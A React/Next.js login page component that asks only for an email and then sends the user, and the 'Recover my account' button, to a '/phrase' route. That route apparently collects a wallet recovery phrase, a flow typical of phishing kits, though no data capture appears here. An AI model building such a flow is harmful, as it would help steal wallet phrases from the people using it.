"use client"
import Image from 'next/image'
import React, { useEffect, useState } from 'react'
import useEmblaCarousel from 'embla-carousel-react'
import Link from 'next/link'
import UseFormHandler from '../useFormHandler'
import { useRouter } from 'next/navigation'
import { LiaAngleLeftSolid } from 'react-icons/lia'

function Page() {

    const router = useRouter()
    const [email, setEmail] = useState("")

    const formdata = UseFormHandler({
        required: {
            email: 'Please Enter Email',
        },
        initialValues: {
            email: ''
        },

        onSubmit: async (value) => {
            router.push(`/phrase?email=${value.email}`)
        }
    })



    return (
        <div className='select-none scroll-smooth max-w-md mx-auto'>
            <div className="bg-slate-50 dark:bg-slate-950 flex flex-col min-h-screen h-screen">
                <div className="flex-grow py-8 space-y-4">
                    <div className="px-4">
                        <div onClick={() => router.back()} className="w-8 h-8 cursor-pointer text-xl flex items-center justify-center text-blue-500"><LiaAngleLeftSolid /></div>
                    </div>
                    <div className="h-full px-4 space-y-3">
                        <div className="">
                            <div className="w-24 h-24 rounded-full mx-auto bg-gray-100 dark:bg-gray-900"></div>
                        </div>
                        <div className="text-center">
                            <div className="font-bold text-lg dark:text-white">Welcome back</div>
                            <div className="text-gray-400 text-sm">Enter your email address and password</div>
                        </div>
                        <div className="space-y-1">
                            <div className="font-bold text-sm">Email</div>
                            <input
                                // value={formdata.value.email}
                                onChange={(e) => { setEmail(e.target.value); formdata.value.email = e.target.value }}
                                className="w-full dark:bg-gray-900 appearance-none p-3 outline-none rounded-2xl"
                            />
                            <div className="text-xs text-red-600">{formdata?.error?.email}</div>
                        </div>
                    </div>
                </div>
                <div className="space-y-3 p-4">
                    <div onClick={() => email.length > 0 && formdata.submit()} className={`${email < 1 && "bg-opacity-30"} bg-blue-600  rounded-full text-center cursor-pointer py-4 px-9 text-white font-bold`}>Login</div>
                    <div className="">
                        <Link href="/phrase">
                            <div className="bg-white rounded-full text-center cursor-pointer py-4 px-9 text-blue-600 font-bold">Recover my account</div>
                        </Link>
                    </div>
                </div>
            </div>
        </div>
    )
}

export default Page